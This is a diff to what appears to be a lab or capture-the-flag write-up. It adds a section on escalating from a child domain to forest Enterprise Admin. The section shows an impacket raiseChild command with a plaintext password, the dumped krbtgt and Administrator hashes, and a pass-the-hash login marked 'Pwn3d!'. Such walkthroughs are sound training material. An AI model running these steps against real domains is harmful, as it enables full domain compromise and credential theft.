@@ -676,8 +676,31 @@ Looking at bloodhound there is a pretty good indicator of a golden ticket attack
 ![](Pasted%20image%2020260419185941.png)
 
 ## Golden ticket
-Ill start by trying to dump the domain admins hash using raise child in the case that SID filterin
+Ill start by trying to dump the domain admins hash using raise child in the case that SID filtering is disabled
 
 ```python
+impacket-raiseChild 'corp.darkhaven.tech'/'ldap_svc':'D@rkhav3nLDAP2024!'             
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
+[*] Raising child domain corp.darkhaven.tech
+[*] Forest FQDN is: darkhaven.tech
+[*] Raising corp.darkhaven.tech to darkhaven.tech
+[*] darkhaven.tech Enterprise Admin SID is: S-1-5-21-1874561643-3508613807-996616505-519
+[*] Getting credentials for corp.darkhaven.tech
+corp.darkhaven.tech/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ac1f5ff2bd2333709b990dadc2530bbf:::
+corp.darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:5e5f596d663bd83e970e6d95a2700c79bf290567b12a9148e770994071ec5d80
+[*] Getting credentials for darkhaven.tech
+darkhaven.tech/krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58c32f4ff3286090889837fe9619147a:::
+darkhaven.tech/krbtgt:aes256-cts-hmac-sha1-96s:4b46aefa864315912f4ab7c27cb0d28652c841828bb0ad92d3a8c6b43c93be47
+[*] Target User account name is Administrator
+darkhaven.tech/Administrator:500:aad3b435b51404eeaad3b435b51404ee:b38a41e844c5c3d706c1e9e575f3e62c:::
+darkhaven.tech/Administrator:aes256-cts-hmac-sha1-96s:3956c7969b120f4c636a8d0e97044fa574ee0ffbcb122903cf0e1ee325134ceb
 ```
+Ive got the hashes
+
+```python
+nxc smb dc.darkhaven.tech -u Administrator -H 'b38a41e844c5c3d706c1e9e575f3e62c'             
+SMB         10.10.10.4      445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:darkhaven.tech) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.10.10.4      445    DC               [+] darkhaven.tech\Administrator:b38a41e844c5c3d706c1e9e575f3e62c (Pwn3d!)
+```
+The administrator has now been compromised 
